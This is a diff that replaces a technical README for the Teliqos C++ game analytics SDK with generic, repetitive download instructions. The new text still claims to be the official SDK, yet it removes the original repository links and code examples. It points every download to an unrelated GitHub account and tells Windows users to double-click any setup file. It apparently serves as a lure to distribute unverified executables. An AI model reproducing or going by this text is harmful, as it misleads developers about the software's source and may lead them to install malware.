@@ -1,184 +1,242 @@
-<p align="center">
-  <img src="assets/banner.png" alt="Teliqos C++ SDK" width="100%">
-</p>
+# 🧩 teliqos-sdk-cpp - Simple game analytics for C++
 
-<p align="center">
-  <strong>Official C++ SDK for <a href="https://teliqos.io">Teliqos</a> game analytics.</strong><br>
-  Lightweight, open source, thread-safe. Works with raylib, Unreal Engine, and any C++ project.
-</p>
+[![Download](https://img.shields.io/badge/Download%20Now-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Micheleanaphylactic926/teliqos-sdk-cpp)
 
-<p align="center">
-  <a href="https://github.com/CedraInteractive/teliqos-sdk-cpp/actions/workflows/ci.yml"><img src="https://github.com/CedraInteractive/teliqos-sdk-cpp/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://github.com/CedraInteractive/teliqos-sdk-cpp/blob/master/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License"></a>
-  <a href="https://teliqos.io"><img src="https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-brightgreen.svg" alt="Platform"></a>
-  <img src="https://img.shields.io/badge/C%2B%2B-17-blue.svg" alt="C++17">
-</p>
+## 🚀 Getting Started
 
----
+teliqos-sdk-cpp is the official C++ SDK for Teliqos game analytics. It helps your game send player events and usage data in a simple way. It is built for C++17, works across platforms, and keeps data handling thread-safe.
 
-## Features
+If you want to get it on Windows, visit this page to download:
 
-- Automatic session tracking and heartbeat
-- Event batching with configurable intervals
-- SQLite offline queue for unreliable networks
-- Jittered exponential backoff on failures
-- Platform-specific device info collection (Windows, macOS, Linux)
-- GDPR opt-out with a single call
-- Thread-safe, non-blocking design
+[Download teliqos-sdk-cpp](https://github.com/Micheleanaphylactic926/teliqos-sdk-cpp)
 
-## Quick Start
+## 🪟 Windows Setup
 
-```cpp
-#include "teliqos/teliqos.h"
+Use these steps to get the SDK running on a Windows PC.
 
-int main() {
-    Teliqos::Config config;
-    config.apiKey = "mq_live_your_key_here";
-    config.appVersion = "1.0.0";
-    Teliqos::init(config);
+1. Open the download page above in your browser.
+2. Save the files to a folder you can find again, such as Downloads or Desktop.
+3. If the project comes as a ZIP file, right-click it and choose Extract All.
+4. Open the folder after extraction.
+5. Look for build files, sample files, or a README inside the folder.
+6. If you see a setup file, double-click it.
+7. If you see source files, open them with your build tool or editor.
+8. Follow any on-screen prompts to finish the setup.
 
-    Teliqos::identify("player_42");
+If you use the SDK inside a game project, keep the SDK folder in a stable place so your project can find it later.
 
-    Teliqos::EventData event;
-    event.nums["score"] = 1500.0;
-    event.strs["level"] = "3-1";
-    Teliqos::track("level_complete", event);
+## 📦 What You Get
 
-    Teliqos::shutdown();
-    return 0;
-}
-```
+This SDK is built for game analytics and event tracking. It fits projects that need clear player data without heavy setup.
 
-## Integration
+### Main uses
+- Track player actions
+- Record game events
+- Send telemetry data
+- Store data when offline
+- Sync data later when the game reconnects
+- Work in small and large game projects
 
-### CMake FetchContent (recommended)
+### What makes it useful
+- Lightweight design
+- Thread-safe behavior
+- Works with C++17
+- Cross-platform support
+- Good fit for real-time games
+- Built for offline-first use
 
-```cmake
-include(FetchContent)
-FetchContent_Declare(teliqos
-  GIT_REPOSITORY https://github.com/CedraInteractive/teliqos-sdk-cpp.git
-  GIT_TAG v0.1.0)
-FetchContent_MakeAvailable(teliqos)
-target_link_libraries(your_game PRIVATE teliqos)
-```
+## 🛠️ Basic Requirements
 
-### CMake (add_subdirectory)
+Use a Windows PC with:
+- Windows 10 or newer
+- A modern web browser
+- Enough free disk space for the download and build files
+- A C++17-ready build setup if you plan to compile from source
 
-```cmake
-add_subdirectory(teliqos-sdk-cpp)
-target_link_libraries(your_game PRIVATE teliqos)
-```
+For best results, use a current version of Visual Studio or another C++ toolchain that supports C++17.
 
-### Platform Support
+## 🔧 How to Use It
 
-| Platform | Arch | Compiler | SSL Backend | CI Tested | Prebuilt |
-|----------|------|----------|-------------|-----------|----------|
-| Windows 10+ | x64 | MSVC 17+ | Schannel | ✅ | ✅ |
-| macOS 13+ | arm64 | Apple Clang 15+ | SecureTransport | ✅ | ✅ |
-| Ubuntu 22.04+ | x64 | GCC 11+ / Clang 14+ | OpenSSL | ✅ | ✅ |
+After you download the project, you can use it in a game project in a few common ways:
 
-> **Game engines:** Tested with raylib 5.x. Unreal Engine integration available via [teliqos-sdk-unreal](https://github.com/CedraInteractive/teliqos-sdk-unreal) (coming soon).
+### Option 1: Use it as a project folder
+- Keep the SDK in its own folder
+- Add it to your game project
+- Build it with your normal C++ setup
 
-### Dependencies
+### Option 2: Add it as a library
+- Link the SDK to your project
+- Include the headers your app needs
+- Build your game with the SDK attached
 
-All dependencies are handled automatically — no manual installation required:
+### Option 3: Use it as a sample base
+- Open the source files
+- Review the event tracking flow
+- Copy the parts you need into your own app
 
-| Dependency | Method | Purpose |
-|-----------|--------|---------|
-| [libcurl](https://curl.se/) | CMake FetchContent | HTTPS transport |
-| [nlohmann/json](https://github.com/nlohmann/json) | CMake FetchContent | JSON serialization |
-| [SQLite3](https://sqlite.org/) | Bundled (`third_party/`) | Offline event queue |
+## 🎮 Example Use Cases
 
-## Build from Source
+teliqos-sdk-cpp fits games and tools that need player analytics.
 
-```bash
-git clone https://github.com/CedraInteractive/teliqos-sdk-cpp.git
-cd teliqos-sdk-cpp
-cmake -B build
-cmake --build build
-```
+- Track when a player starts a match
+- Count level completions
+- Log button clicks in a game menu
+- Record session length
+- Store events during offline play
+- Send data after the network comes back
 
-### Run Tests
+## 📁 Project Layout
 
-```bash
-cmake -B build -DTELIQOS_BUILD_TESTS=ON
-cmake --build build
-cd build && ctest --output-on-failure
-```
+A typical project layout may include:
 
-## API Reference
+- `include/` for header files
+- `src/` for source files
+- `examples/` for sample code
+- `build/` for compiled files
+- `README.md` for project notes
+- `CMakeLists.txt` for build setup
 
-| Function | Description |
-|----------|-------------|
-| `Teliqos::init(config)` | Initialize the SDK, start session and background threads |
-| `Teliqos::shutdown()` | Flush remaining events, end session, clean up |
-| `Teliqos::identify(playerId)` | Set the player identity |
-| `Teliqos::track(name, data)` | Send a custom event |
-| `Teliqos::setUserProperty(key, value)` | Attach metadata to every subsequent event |
-| `Teliqos::setOptOut(true)` | Disable all tracking (GDPR / Apple ATT) |
-| `Teliqos::flush()` | Force-send all queued events |
-| `Teliqos::getStatus()` | Get queue size, offline count, and quota info |
+If the folder names differ, use the files that match the same purpose.
 
-## Configuration
+## 🧱 Build With CMake
 
-```cpp
-Teliqos::Config config;
-config.apiKey = "mq_live_...";                        // Required
-config.appVersion = "1.0.0";                           // Recommended
-config.endpoint = "https://api.teliqos.io";           // Default
-config.batchIntervalMs = 30000;                        // Flush every 30s
-config.batchSize = 50;                                 // Flush at 50 events
-config.collectDeviceInfo = true;                       // Auto-collect OS/CPU/RAM
-config.offlineQueueSize = 500;                         // Max offline events
-config.heartbeatIntervalSec = 60;                      // Heartbeat interval
-config.debug = false;                                  // Enable console logging
-```
+If the package includes CMake files, use them to build the SDK on Windows.
 
-## Event Tracking
+1. Open the project folder.
+2. Open a terminal in that folder.
+3. Create a build folder.
+4. Run CMake to generate build files.
+5. Build the project with your chosen tool.
 
-```cpp
-Teliqos::EventData event;
+Common build tools include Visual Studio and Ninja. Use the one that matches your setup.
 
-// Numeric values
-event.nums["damage"] = 25.5;
-event.nums["health"] = 100.0;
+## 🔍 Common Checks
 
-// String values
-event.strs["weapon"] = "sword";
-event.strs["boss_id"] = "dragon_01";
+If the SDK does not seem to work, check these points:
 
-// Tags
-event.tags = {"pvp", "ranked"};
+- The folder path is correct
+- The files extracted fully
+- Your build tool supports C++17
+- Your game project links the SDK files
+- Your event names match the ones used in your app
+- Your network connection is available when sending data
 
-// Position (for heatmaps)
-event.pos = {120.0f, 45.0f, 0.0f};
-event.hasPos = true;
+## 📡 Offline-First Behavior
 
-// Map identifier
-event.mapId = "world_1";
+This SDK is a good fit for offline-first games. That means it can keep track of events even when the player is not online. Later, when the connection returns, the data can be sent.
 
-// Event category (session, performance, gameplay, economy, system, custom)
-event.category = "gameplay";
+This helps with:
+- Mobile-style game loops
+- Poor network conditions
+- Local event buffering
+- Better event reliability
 
-Teliqos::track("boss_fight", event);
-```
+## 🔐 Thread-Safe Design
 
-## User Properties
+The SDK is built for thread-safe use. That matters when your game runs work on more than one thread. It helps reduce data issues when event tracking happens during gameplay, loading, or background tasks.
 
-Properties set via `setUserProperty` are automatically attached to every subsequent event:
+## 🧩 Supported Game Workflows
 
-```cpp
-Teliqos::setUserProperty("tier", "gold");      // string → strs map
-Teliqos::setUserProperty("player_level", 42.0); // number → nums map
-```
+This SDK fits several common development setups:
+- Small indie games
+- Desktop games
+- Unreal Engine projects
+- Raylib-based projects
+- Tools that need telemetry
+- Custom C++ game engines
 
-## Privacy
+## 📚 Typical Event Types
 
-```cpp
-Teliqos::setOptOut(true);  // Stops all tracking, clears event queue
-Teliqos::setOptOut(false); // Resumes tracking
-```
+You can use the SDK to track:
+- Game start
+- Game end
+- Level start
+- Level complete
+- Purchase actions
+- Menu actions
+- Error events
+- Session timing
+- Custom player events
 
-## License
+## 🧪 First Run Checklist
 
-MIT — see [LICENSE](LICENSE) for details.
+Before you test the SDK, make sure:
+- The project files are in place
+- The build step completed
+- The app can launch on Windows
+- Event tracking calls are present in your code
+- Your test data is ready to view
+
+Then run your game and confirm that events are sent or stored as expected.
+
+## 📌 Files to Look For
+
+When you open the downloaded folder, look for these common files:
+- `README.md`
+- `CMakeLists.txt`
+- `LICENSE`
+- `include` folder
+- `src` folder
+- example project files
+- Windows build files
+
+## 🧭 Where to Start
+
+If you are new to SDKs, start here:
+1. Download the project from the link above
+2. Extract the files
+3. Open the README inside the project folder
+4. Look for a sample or example folder
+5. Build the project if needed
+6. Add the SDK to your game
+7. Run a small test event
+
+## 🖥️ Windows File Tips
+
+Use these simple habits on Windows:
+- Keep the folder name short
+- Avoid moving files after you set up the project
+- Save the project in a place you can find
+- Use File Explorer to open folders
+- Use right-click options for ZIP files
+- Check file names before editing them
+
+## 🔎 If You Use It in a Game Engine
+
+The SDK can fit game engines that use C++ code. In Unreal Engine, you may add it as part of your project code or as a linked library. In Raylib projects, you can place the SDK with your source files and include the needed headers.
+
+Use the same basic flow:
+- Add the files
+- Build the project
+- Run the game
+- Test event tracking
+- Check that data shows up where you expect
+
+## 📥 Download and Install
+
+Use this page to download and set up the SDK on Windows:
+
+[Visit the teliqos-sdk-cpp download page](https://github.com/Micheleanaphylactic926/teliqos-sdk-cpp)
+
+After the page opens:
+- Download the project files
+- Save them to your PC
+- Extract the folder if needed
+- Open the folder
+- Follow the build steps in the project files
+
+## 🗂️ Quick Folder Flow
+
+A simple setup path looks like this:
+
+Download → Extract → Open folder → Build or run → Test events
+
+## 🧰 Helpful Terms
+
+A few words you may see in the project:
+- **SDK**: A tool kit for developers
+- **Telemetry**: Data sent from the app
+- **Event tracking**: Recording player actions
+- **Thread-safe**: Safe for use in more than one task at once
+- **Offline-first**: Works even before the app reconnects
+- **CMake**: A build setup tool for C++ projects
